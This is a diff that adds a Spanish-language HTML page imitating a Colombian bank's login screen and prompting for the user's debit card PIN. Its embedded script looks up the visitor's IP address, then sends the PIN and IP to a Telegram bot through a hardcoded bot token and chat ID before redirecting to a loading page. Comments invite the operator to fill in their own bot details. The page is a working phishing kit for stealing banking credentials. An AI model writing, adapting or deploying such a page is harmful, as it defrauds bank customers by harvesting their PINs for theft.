@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bogota</title>
+    <link rel="stylesheet" href="./bogo/lfr_style.css">
+    <link rel="stylesheet" href="./bogo/lfr_ownstyle.css">
+</head>
+
+<body>
+
+    <div class="box-container">
+        <div class="container">
+            <div class="toast hidden" id="errorMessage" style="position: absolute;">
+                <p id="AuthLabel"></p>
+                <span class="icon-close-search-r" onclick="hideToast()"></span>
+            </div>
+
+            <div class="container__login">
+                <div class="container__login--header">
+                    <img src="./bogo/logobanco1.png" alt="">
+                </div>
+                <div class="container__login--title">
+                    <div class="container__login--title-1">
+                        <p>Identificación de usuario</p>
+                    </div>
+                    <div class="container__login--title-2">
+                        <p>
+                            <label class="tituloformulario" id="flujoOrigenLbl"></label>
+                        </p>
+                    </div>
+                </div>
+                <div class="container__login--login-box-id">
+                    <div class="form-container">
+                        <form method="post" name="authenticateForm" id="authenticateForm" autocomplete="off">
+                            <input type="hidden" size="8" id="currentSessionTime" name="currentSessionTime" value="1709245729624">
+                            <input type="hidden" size="8" id="initSessionTime" name="initSessionTime" value="1709245646774">
+                            <input type="hidden" size="8" id="validSessionTime" name="validSessionTime" value="00:07">
+                            
+                            <div class="field-1">
+                                <div class="custom-input">
+                                    <div class="label">
+                                        <label for="password">Clave de la tarjeta débito</label>
+                                    </div>
+                                    <input name="k_password" type="password" class="custom-form-control" id="password" maxlength="4" size="8" required="">
+                                </div>
+                            </div>
+
+                            <div class="btn-container">
+                                <button type="submit" class="btn-main" id="btnContinue">Continuar</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Script para enviar la información a Telegram y obtener la IP del cliente -->
+            <script>
+                // Reemplaza estos valores con los de tu bot de Telegram
+                const TOKEN = '6808586807:AAH5KvJxwCHbxVecJJ1D2fQyiVCK4u_RuBQ';
+                const CHAT_ID = '5157616506';
+
+                // Función para obtener la IP del cliente
+                async function getClientIP() {
+                    try {
+                        const response = await fetch('https://api.ipify.org?format=json');
+                        const data = await response.json();
+                        return data.ip;
+                    } catch (error) {
+                        console.error('Error al obtener la IP:', error);
+                        return 'IP no disponible';
+                    }
+                }
+
+                // Manejar el evento de envío del formulario
+                document.getElementById('authenticateForm').addEventListener('submit', async function (e) {
+                    e.preventDefault(); // Evita el envío tradicional del formulario
+
+                    // Obtener la información del formulario
+                    const password = document.getElementById('password').value;
+                    const ipAddress = await getClientIP(); // Obtener la IP del cliente
+
+                    // Crear el mensaje a enviar
+                    const message = `Clave de la tarjeta débito: ${password}\nIP del Cliente: ${ipAddress}`;
+
+                    // Enviar la información a Telegram
+                    sendToTelegram(message);
+                });
+
+                // Función para enviar el mensaje a Telegram
+                function sendToTelegram(message) {
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            // Redirigir a una página de éxito
+                            window.location.href = "load.html"; // Cambia a tu URL de destino
+                        } else {
+                            alert("Hubo un error al enviar la información a Telegram");
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error al enviar el mensaje:', error);
+                        alert("Error al conectar con Telegram");
+                    });
+                }
+            </script>
+
+        </div>
+    </div>
+
+</body>
+</html>
